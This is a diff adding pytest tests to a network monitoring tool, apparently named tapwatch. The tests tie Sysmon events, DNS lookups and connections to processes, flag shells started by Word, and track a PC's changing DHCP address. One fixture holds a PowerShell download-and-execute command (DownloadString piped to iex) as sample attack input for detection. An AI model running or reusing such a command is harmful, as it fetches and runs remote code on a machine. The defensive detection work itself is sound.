@@ -519,3 +519,168 @@ def test_user_install_folder_still_needs_a_signature():
     path = "C:\\Users\\<user>\\AppData\\Local\\Programs\\app\\App.exe"
     r = assess([Owner(name="App.exe", path=path, signature="missing")], "other_program")
     assert r == ("unclear", ["App.exe is installed for one user, but isn't code-signed"])
+
+
+# ------------------------------------------------------------ Sysmon (Windows)
+
+def sysmon(eid, t, **cols):
+    utc = datetime.fromtimestamp(t, timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    return {"name": "sysmon_events", "unixTime": T0 + 60, "action": "added",
+            "columns": {"eventid": str(eid), "utc": utc, **cols}}
+
+
+PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+GUID = "{aaaaaaaa-0000-0000-0000-000000000001}"
+
+
+def sysmon_log(tmp_path, parent="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"):
+    log = tmp_path / "osqueryd.results.log"
+    log.write_text("\n".join(json.dumps(r) for r in [
+        # as osquery logs it: signals computed, raw text kept because a suspicious one (dl, iex) fired
+        sysmon(1, T0 - 30, guid=GUID, path=PS, parent_path=parent, cmd_dl="1", cmd_iex="1", cmd_url="1",
+               cmdline="powershell -c (New-Object Net.WebClient).DownloadString('https://dl.example/a') | iex"
+                       " ; $h=@{token='hunter2'}"),
+        sysmon(3, T0 + 1, guid=GUID, path=PS, remote_address=DST, remote_port="443"),
+        sysmon(22, T0, guid=GUID, path=PS, query="dl.example"),
+    ]))
+    return log
+
+
+def test_sysmon_ties_short_connections_and_dns_lookups_to_process_and_command_line(tmp_path):
+    idx = OwnerIndex()
+    idx.read_log(sysmon_log(tmp_path), since=0)
+    idx.resolve()
+    (conn_owner,) = idx.who(DST, 443, T0 + 2)          # a 1-second connection a snapshot would miss
+    (dns_owner,) = idx.who_dns("DL.example.", T0 + 5)
+    for o in (conn_owner, dns_owner):
+        assert o.name == "powershell.exe" and o.parent == "WINWORD.EXE"
+        assert "dl.example" in o.cmdline and "hunter2" not in o.cmdline   # redacted
+    assert idx.who(DST, 443, T0 + 600) == [] and idx.who_dns("dl.example", T0 + 600) == []
+
+
+def test_a_document_app_starting_a_shell_is_suspicious(tmp_path):
+    idx = OwnerIndex()
+    idx.read_log(sysmon_log(tmp_path), since=0)
+    idx.resolve()
+    assessment, signals = assess(idx.who(DST, 443, T0), "other_program")
+    assert assessment == "suspicious" and any("started by WINWORD.EXE" in s for s in signals)
+    idx = OwnerIndex()
+    idx.read_log(sysmon_log(tmp_path, parent="C:\\Windows\\explorer.exe"), since=0)
+    idx.resolve()
+    assert not any("started by" in s for s in assess(idx.who(DST, 443, T0), "other_program")[1])
+
+
+def test_collect_counts_dns_lookups_tied_to_a_program(tmp_path):
+    hc = HostContext(PC, None, [sysmon_log(tmp_path)], str(tmp_path / "t"), runner=FakeRunner([]))
+    dns_rows = [{"ts": T0, "id.orig_h": PC, "query": "dl.example", "answers": [DST]},
+                {"ts": T0, "id.orig_h": PC, "query": "nobody-asked.example"}]
+    facts = hc.collect(case(indicators=[]), [], dns_rows, now=T0 + 3600)
+    assert (facts["host_lookups"], facts["host_lookups_matched"]) == (2, 1)
+    assert facts["host_programs"] == ["powershell.exe"] and facts["host_assessment"] == "suspicious"
+
+
+def test_pseudo_processes_are_not_listed_as_programs(tmp_path):
+    log = tmp_path / "osqueryd.results.log"
+    rows = [{"name": "outbound_connections", "unixTime": T0, "action": "added",
+             "columns": {"name": n, "path": p, "remote_address": DST, "remote_port": "443", "pid": "4"}}
+            for n, p in (("[System Process]", ""), ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\chrome.exe"))]
+    log.write_text("\n".join(json.dumps(r) for r in rows))
+    hc = HostContext(PC, None, [log], str(tmp_path / "t"), runner=FakeRunner([]))
+    facts = hc.collect(case(indicators=[]), [out_conn(T0)], [], now=T0 + 3600)
+    assert facts["host_programs"] == ["chrome.exe"]
+
+
+def test_command_line_signals_without_raw_text(tmp_path):
+    """Benign command lines never reach the log; osquery's signals still feed the assessment."""
+    log = tmp_path / "osqueryd.results.log"
+    rows = [sysmon(1, T0 - 30, guid="{g1}", path=PS, parent_path="C:\\Windows\\explorer.exe", cmd_enc="1"),
+            sysmon(3, T0, guid="{g1}", path=PS, remote_address=DST, remote_port="443"),
+            sysmon(1, T0 - 30, guid="{g2}", path=PS, parent_path="C:\\Windows\\explorer.exe", cmd_hidden="1",
+                   cmd_bypass="1"),
+            sysmon(3, T0, guid="{g2}", path=PS, remote_address=DST, remote_port="8443")]
+    log.write_text("\n".join(json.dumps(r) for r in rows))
+    idx = OwnerIndex()
+    idx.read_log(log, since=0)
+    idx.resolve()
+    (enc,) = idx.who(DST, 443, T0)
+    assert enc.cmdline == "" and enc.cmd_flags == ("enc",)
+    assert assess([enc], "other_program") == ("suspicious", ["powershell.exe's command line has an encoded payload"])
+    (hidden,) = idx.who(DST, 8443, T0)
+    assert assess([hidden], "other_program")[0] == "unclear"
+
+
+# ----------------------------------------------------------- the PC's own addresses (DHCP moves it)
+
+def addr_snap(ts, *addrs):
+    return json.dumps({"name": "host_addresses", "action": "snapshot", "unixTime": int(ts),
+                       "snapshot": [{"address": a} for a in addrs]}) + "\n"
+
+
+NEW_IP = "192.168.50.77"
+
+
+def test_agent_reported_addresses_beat_the_configured_ip(tmp_path):
+    log = tmp_path / "osqueryd.results.log"
+    log.write_text(addr_snap(T0 - 300, NEW_IP, "100.64.0.5") + addr_snap(T0, NEW_IP))
+    hc = HostContext(PC, None, [log])
+    assert hc.is_this_pc(NEW_IP, T0 + 60)
+    assert not hc.is_this_pc(PC, T0 + 60)              # the configured IP moved on: maybe another device now
+    assert hc.is_this_pc(PC, T0 - 86400)               # no reports back then: the configured IP still counts
+    assert "192.168.50.77" in hc.config_mismatch(T0) and PC in hc.config_mismatch(T0)
+    with log.open("a") as fh:                          # appended later: read incrementally
+        fh.write(addr_snap(T0 + 3600, PC))
+    assert hc.is_this_pc(PC, T0 + 3600) and hc.config_mismatch(T0 + 3600) is None
+
+
+def test_half_written_and_rotated_logs(tmp_path):
+    log = tmp_path / "osqueryd.results.log"
+    log.write_text(addr_snap(T0, NEW_IP) + addr_snap(T0 + 300, NEW_IP)[:20])
+    hc = HostContext(PC, None, [log, tmp_path / "missing.log"])
+    assert hc.addresses_near(T0 + 300) == {NEW_IP}
+    with log.open("a") as fh:                          # the rest of that line arrives
+        fh.write(addr_snap(T0 + 300, NEW_IP)[20:])
+    assert len(hc._snaps) == 1 and hc.addresses_near(T0 + 300) == {NEW_IP}
+    hc._read_addresses()
+    assert len(hc._snaps) == 2
+    log.write_text(addr_snap(T0 + 600, PC))            # rotated: smaller than what was read
+    assert PC in hc.addresses_near(T0 + 600)
+
+
+def test_case_on_the_pcs_new_address_gets_host_context(tmp_path):
+    from conftest import dns, write_logs
+
+    from tapwatch.detectors import TakeoverChannel
+    from tapwatch.pipeline import Pipeline
+    from tapwatch.store import Store
+
+    log = tmp_path / "osqueryd.results.log"
+    log.write_text(addr_snap(T0, NEW_IP))
+    zeek = write_logs(tmp_path, conn=[dict(out_conn(T0), _type="conn", **{"id.orig_h": NEW_IP})])
+    hc = HostContext(PC, None, [log], str(tmp_path / "t"))
+    p = Pipeline([TakeoverChannel()], Assets(), Store(":memory:"), hostctx=hc, zeek_dirs=[str(zeek)])
+    (_, c, _, _), = p.process(dns(T0, "abc.ngrok.io", src=NEW_IP))
+    assert c.facts["host_conns"] == 1
+
+
+def test_follow_this_pc_moves_admin_and_dev_rules(tmp_path, caplog):
+    from tapwatch import detectors as det
+    from tapwatch.pipeline import Pipeline
+    from tapwatch.store import Store
+
+    log = tmp_path / "osqueryd.results.log"
+    log.write_text(addr_snap(T0, NEW_IP))
+    dev = det.DevProfile([PC])
+    w = det.Warmup(0)
+    mgmt = det.ManagementAccess(w, admin_devices={PC, "192.168.50.2"})
+    other = det.DevProfile(["192.168.50.3"])          # names another device: left alone
+    p = Pipeline([det.SuspiciousDNS(dev=dev), det.OddPort(dev=dev), det.NewExternalDomain(w, dev=other), mgmt],
+                 Assets(), Store(":memory:"), hostctx=HostContext(PC, None, [log]))
+    assert p.follow_this_pc(T0) == {NEW_IP}
+    assert dev.hosts == {PC, NEW_IP} and mgmt.admins == {PC, "192.168.50.2", NEW_IP}
+    assert other.hosts == {"192.168.50.3"}
+    assert "host_context.host is 192.168.50.10" in caplog.text
+    with log.open("a") as fh:
+        fh.write(addr_snap(T0 + 3600, "192.168.50.88"))
+    p.follow_this_pc(T0 + 3600)
+    assert dev.hosts == {PC, "192.168.50.88"}          # the old lease is dropped
+    assert p.follow_this_pc(T0 + 90 * 86400) is None and dev.hosts == {PC, "192.168.50.88"}
